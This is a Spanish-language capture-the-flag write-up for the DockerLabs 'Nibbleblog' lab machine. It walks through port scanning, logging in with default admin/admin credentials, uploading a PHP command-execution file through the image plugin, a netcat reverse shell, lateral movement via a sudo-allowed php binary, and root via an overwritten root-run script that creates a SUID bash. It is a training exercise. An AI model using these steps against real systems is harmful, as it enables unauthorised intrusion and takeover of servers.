# Nibbleblog - Writeup (DockerLabs)


**Fecha:** **2026-07-14**
Plataforma:  **[DockerLabs](https://dockerlabs.es/)**
**IP objetivo:** 172.17.0.2
**Dificultad**: Fácil

Descripcion: Laboratorio para practicar la explotación del CMS Nibbleblog para obtener una shell y escalar privilegios en Linux.


![](images/Pasted%20image%2020260714203808.png)

---

## 1. Reconocimiento

### Ping

```bash
ping -c2 172.17.0.2
```

```
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.150 ms
64 bytes from 172.17.0.2: icmp_seq=2 ttl=64 time=0.032 ms
```

TTL = 64 → indica sistema **Linux**.

### Nmap - descubrimiento de puertos

```bash
sudo nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN services.txt
```

```
Nmap scan report for 172.17.0.2
Host is up (0.0000030s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE
80/tcp open  http
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

### Nmap - detección de servicios y versiones

```bash
sudo nmap -p 80 -sCV --min-rate 5000 172.17.0.2 -oA ports
```

```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

### Resumen de servicios y puertos abiertos

|Puerto|Servicio|Versión|
|---|---|---|
|80/tcp|http|Apache httpd 2.4.41 (Ubuntu)|

### Whatweb

```bash
whatweb 172.17.0.2
```

```
http://172.17.0.2 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[172.17.0.2], Title[Apache2 Ubuntu Default Page: It works]
```

---

## 2. Enumeración web (puerto 80)

Al ingresar la IP nos encontramos con la página por defecto de Apache. Revisando el código fuente (Ctrl+U) se obtiene una URL adicional.

![[Pasted image 20260714191503.png]]

Mostrando su contenido:

![[Pasted image 20260714191550.png]]

Lo importante acá es que nos entregan una URL adicional: _"Start publishing from your dashboard"_ → `http://172.17.0.2/nibbleblog/admin.php`

![[Pasted image 20260714191656.png]]

Esta redirige a un panel de administración (Nibbleblog). Se pueden probar credenciales por defecto (`admin`/`admin`, `admin`/`password`, etc.) o hacer fuerza bruta con Hydra.

Al probar `admin`/`admin` se obtiene acceso como administrador:

![[Pasted image 20260714191836.png]]

---

## 3. Explotación

### 3.1 Localizar función de subida de archivos

Revisando el panel, en la sección de **Plugins** se encuentra una opción que permite subir imágenes:

![[Pasted image 20260714193313.png]]

Al entrar en "Configure" aparece un formulario para subir un archivo:

![[Pasted image 20260714193619.png]]

Se sube un archivo `.jpg` de prueba y el formulario indica que se subió con éxito. Ahora es necesario averiguar en qué ruta quedó almacenado.

### 3.2 Fuzzing para ubicar el archivo subido

```bash
gobuster dir -u http://172.17.0.2/nibbleblog/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x txt,php,html,bak
```

![[Pasted image 20260714192502.png]]

Revisando las rutas encontradas se ubica la ruta exacta donde quedan almacenadas las imágenes subidas:

![[Pasted image 20260714193902.png]]

### 3.3 Intento de subida de reverse shell (PHP)

Se crea un archivo `shell.php` para probar ejecución de comandos:

```php
<?php
echo "--- PROBANDO SHELL EXEC ---<br>";
echo shell_exec('whoami');
echo "<br>--- PROBANDO PASSTHRU ---<br>";
passthru('whoami');
echo "<br>--- PROBANDO EXEC ---<br>";
exec('whoami', $output); print_r($output);
?>
```

Al subirlo:

![[Pasted image 20260714194248.png]]

El archivo se sube correctamente, pero el plugin arroja un error indicando que el servidor **falló al intentar abrirlo o interpretarlo como una imagen válida** (validación de imagen fallida, aunque el archivo igual se almacena).

Se confirma que el archivo quedó subido correctamente:

![[Pasted image 20260714194457.png]]

Al acceder directamente al archivo se comprueba el bypass: se ejecuta PHP en el servidor y se obtiene el usuario `www-data`:

![[Pasted image 20260714194916.png]]

### 3.4 Reverse shell

Se pone en escucha Netcat en el puerto 4444:

```bash
nc -lvnp 4444
```

Se genera una reverse shell (PHP, estilo pentestmonkey) usando [revshells.com](https://www.revshells.com/) y se sube en lugar del archivo de prueba anterior:

![[Pasted image 20260714195751.png]]

Al acceder al archivo subido se recibe la conexión en la sesión de Netcat.

### 3.5 Tratamiento de la TTY

Una vez dentro, se estabiliza la terminal:

```bash
script /dev/null -c bash
```

Luego `CTRL + Z` para poner el proceso en background, y en la terminal local:

```bash
stty raw -echo; fg
```

Al volver al foreground, dentro de la shell:

```bash
reset
export SHELL=bash
export TERM=xterm
clear
```

---

## 4. Post-explotación / Enumeración del sistema

```bash
www-data@e0c55160789f:/$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## 5. Escalada de privilegios

### 5.1 Permisos sudo

![[Pasted image 20260714200342.png]]

Se observa que `www-data` puede ejecutar `/usr/bin/php` como el usuario `chocolate` sin contraseña. Se consulta [GTFOBins - php](https://gtfobins.org/gtfobins/php/) y se utiliza:

```bash
sudo -u chocolate /usr/bin/php -r "system('/bin/bash')"
```

Con esto se obtiene una shell como el usuario **chocolate**.

### 5.2 Cron job explotable (chocolate → root)

Revisando procesos en ejecución:

```bash
ps aux
```

![[Pasted image 20260714201354.png]]

Se identifica un script en PHP (`/opt/script.php`) ejecutado por **root** de forma constante, cada 5 segundos (probablemente vía cron o un bucle en segundo plano).

Al revisar los permisos de la carpeta y el archivo, se comprueba que `/opt/script.php` tiene permisos de escritura para el usuario actual, y que la carpeta `/opt` tiene permisos de escritura para todos (world-writable):

![[Pasted image 20260714201630.png]]

### 5.3 Sobrescritura del script para escalar a root

Se sobrescribe el contenido de `/opt/script.php` para que, la próxima vez que el proceso de root lo ejecute, cree una copia de `/bin/bash` con el bit SUID activado en `/tmp`:

```bash
echo "<?php system('cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash'); ?>" > /opt/script.php
```

Tras esperar el intervalo de ejecución (~5 segundos), se verifica en `/tmp` que el binario fue creado con el SUID de root:

![[Pasted image 20260714202131.png]]

Con esto, ejecutando:

```bash
/tmp/rootbash -p
```

se obtiene una shell con privilegios de **root**.

---

## 6. Enumeración adicional (post-compromiso)

### Binarios con permisos SUID

```bash
find / -perm -4000 -type f 2>/dev/null
```

```
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/su
/usr/bin/umount
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
```

Ninguno de estos aporta un vector adicional relevante; la escalada ya se logró mediante el cron job en `/opt/script.php`.

---

## 7. Resumen del ataque

1. **Recon:** único puerto abierto, 80/tcp (Apache 2.4.41).
2. **Enumeración web:** panel de Nibbleblog (`/nibbleblog/admin.php`) accesible con credenciales por defecto `admin:admin`.
3. **Explotación:** plugin de subida de imágenes permite subir un archivo `.php` (bypass de validación de imagen) → RCE como `www-data`.
4. **Movimiento lateral:** `sudo` mal configurado permite ejecutar `php` como el usuario `chocolate` (GTFOBins).
5. **Escalada a root:** `/opt/script.php`, ejecutado periódicamente por root, es escribible por cualquier usuario → se sobrescribe para copiar `/bin/bash` con SUID → shell de root.

---

